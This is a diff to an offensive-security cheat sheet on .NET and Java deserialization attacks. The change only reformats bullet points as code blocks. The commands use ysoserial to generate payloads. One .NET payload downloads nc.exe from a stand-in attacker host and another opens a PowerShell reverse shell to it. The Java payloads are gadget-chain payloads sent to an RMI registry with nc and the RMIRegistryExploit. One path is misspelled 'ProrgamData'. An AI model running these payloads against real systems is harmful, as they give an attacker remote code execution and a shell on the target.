@@ -12,22 +12,24 @@
 
 ## .NET Deserialization
 
- - unzip the zipped ysoserial file if you have downloaded it from the releases of the repository
- 
- - .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl ATTACKER_IP/nc.exe -o C:\ProgramData\nc.exe"
+#### 1) unzip the zipped ysoserial file if you have downloaded it from the releases of the repository
 
- - .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProrgamData\nc.exe -e powershell ATTACKER_IP PORT"
+#### 2) Then
+ 
+    .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl ATTACKER_IP/nc.exe -o C:\ProgramData\nc.exe"
+
+    .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProrgamData\nc.exe -e powershell ATTACKER_IP PORT"
 
 ### Inject the payload somewhere that uses serialized data like cookies (example)
 
 ## Java
 
- - java -jar ysoserial.jar CommonsCollection1 calc.exe | xxd
+    java -jar ysoserial.jar CommonsCollection1 calc.exe | xxd
 
- - java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+    java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
 
- - nc 10.10.10.10 1099 < groovypayload.bin
+    nc 10.10.10.10 1099 < groovypayload.bin
 
- - java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 
 
